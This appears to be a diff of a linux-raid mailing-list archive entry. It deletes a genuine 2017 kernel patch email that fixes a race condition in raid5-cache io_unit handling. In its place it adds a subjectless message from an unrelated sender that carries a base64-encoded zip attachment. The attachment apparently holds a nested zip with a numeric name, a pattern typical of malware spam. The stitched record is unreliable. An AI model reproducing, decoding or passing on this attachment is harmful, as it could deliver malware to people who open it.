@@ -1,117 +1,60 @@
-From: Song Liu <songliubraving@fb.com>
-Subject: [PATCH v2 2/2] md/r5cache: fix io_unit handling in r5l_log_endio()
-Date: Mon, 31 Jul 2017 14:52:27 -0700
-Message-ID: <20170731215227.2409587-2-songliubraving@fb.com>
-References: <20170731215227.2409587-1-songliubraving@fb.com>
+From: <xa0ajutor@colectiv.info>
+Subject: (unknown)
+Date: Tue, 01 Aug 2017 01:35:07 -0000
+Message-ID: <150155130768.22644.6496220083556422130@internetathome.com.bd>
 Mime-Version: 1.0
-Content-Type: text/plain
+Content-Type: application/zip; name="EMAIL_2558300_linux-raid.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-raid-owner@vger.kernel.org>
-In-Reply-To: <20170731215227.2409587-1-songliubraving@fb.com>
+Content-Disposition: attachment
+Subject: 
 Sender: linux-raid-owner@vger.kernel.org
 To: linux-raid@vger.kernel.org
-Cc: shli@fb.com, neilb@suse.com, kernel-team@fb.com, dan.j.williams@intel.com, hch@infradead.org, jes.sorensen@gmail.com, Song Liu <songliubraving@fb.com>
 List-Id: linux-raid.ids
 
-In r5l_log_endio(), once log->io_list_lock is released, the io unit
-may be accessed (or even freed) by other threads. Current code
-doesn't handle the io_unit properly, which leads to potential race
-conditions.
-
-This patch solves this race condition by:
-
-1. Add a pending_stripe count flush_payload. Note that multiple
-   flush_payloads are counted as only one pending_stripe. Flag
-   has_flush_payload is added to show whether the io unit has
-   flush_payload;
-2. In r5l_log_endio(), check flags has_null_flush and
-   has_flush_payload with log->io_list_lock held. After the lock
-   is released, this IO unit is only accessed when we know the
-   pending_stripe counter cannot be zeroed by other threas.
-
-Signed-off-by: Song Liu <songliubraving@fb.com>
----
- drivers/md/raid5-cache.c | 33 ++++++++++++++++++++++++++++-----
- 1 file changed, 28 insertions(+), 5 deletions(-)
-
-diff --git a/drivers/md/raid5-cache.c b/drivers/md/raid5-cache.c
-index 98b5aa9..76c236c 100644
---- a/drivers/md/raid5-cache.c
-+++ b/drivers/md/raid5-cache.c
-@@ -239,6 +239,7 @@ struct r5l_io_unit {
- 	unsigned int has_flush:1;		/* include flush request */
- 	unsigned int has_fua:1;			/* include fua request */
- 	unsigned int has_null_flush:1;		/* include empty flush request */
-+	unsigned int has_flush_payload:1;	/* include flush payload  */
- 	/*
- 	 * io isn't sent yet, flush/fua request can only be submitted till it's
- 	 * the first IO in running_ios list
-@@ -571,6 +572,8 @@ static void r5l_log_endio(struct bio *bio)
- 	struct r5l_io_unit *io_deferred;
- 	struct r5l_log *log = io->log;
- 	unsigned long flags;
-+	bool has_null_flush;
-+	bool has_flush_payload;
- 
- 	if (bio->bi_status)
- 		md_error(log->rdev->mddev, log->rdev);
-@@ -580,6 +583,19 @@ static void r5l_log_endio(struct bio *bio)
- 
- 	spin_lock_irqsave(&log->io_list_lock, flags);
- 	__r5l_set_io_unit_state(io, IO_UNIT_IO_END);
-+
-+	/*
-+	 * if the io doesn't not have null_flush or flush payload,
-+	 * it is not safe to access it after releasing io_list_lock.
-+	 * Therefore, it is necessary to check the condition with
-+	 * the lock held.
-+	 */
-+	has_null_flush = io->has_null_flush;
-+	has_flush_payload = io->has_flush_payload;
-+	/* finish flush only io_unit and PAYLOAD_FLUSH only io_unit */
-+	if (atomic_read(&io->pending_stripe) == 0)
-+		__r5l_set_io_unit_state(io, IO_UNIT_STRIPE_END);
-+
- 	if (log->need_cache_flush && !list_empty(&io->stripe_list))
- 		r5l_move_to_end_ios(log);
- 	else
-@@ -600,18 +616,20 @@ static void r5l_log_endio(struct bio *bio)
- 	if (log->need_cache_flush)
- 		md_wakeup_thread(log->rdev->mddev->thread);
- 
--	if (io->has_null_flush) {
-+	if (has_null_flush) {
- 		struct bio *bi;
- 
- 		WARN_ON(bio_list_empty(&io->flush_barriers));
- 		while ((bi = bio_list_pop(&io->flush_barriers)) != NULL) {
- 			bio_endio(bi);
--			atomic_dec(&io->pending_stripe);
-+			if (atomic_dec_and_test(&io->pending_stripe)) {
-+				__r5l_stripe_write_finished(io);
-+				return;
- 			}
- 		}
--
--	/* finish flush only io_unit and PAYLOAD_FLUSH only io_unit */
--	if (atomic_read(&io->pending_stripe) == 0)
-+	}
-+	if (has_flush_payload)
-+		if (atomic_dec_and_test(&io->pending_stripe))
- 			__r5l_stripe_write_finished(io);
- }
- 
-@@ -881,6 +899,11 @@ static void r5l_append_flush_payload(struct r5l_log *log, sector_t sect)
- 	payload->size = cpu_to_le32(sizeof(__le64));
- 	payload->flush_stripes[0] = cpu_to_le64(sect);
- 	io->meta_offset += meta_size;
-+	/* multiple flush payloads count as one pending_stripe */
-+	if (!io->has_flush_payload) {
-+		io->has_flush_payload = 1;
-+		atomic_inc(&io->pending_stripe);
-+	}
- 	mutex_unlock(&log->io_mutex);
- }
- 
--- 
-2.9.3
-
+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
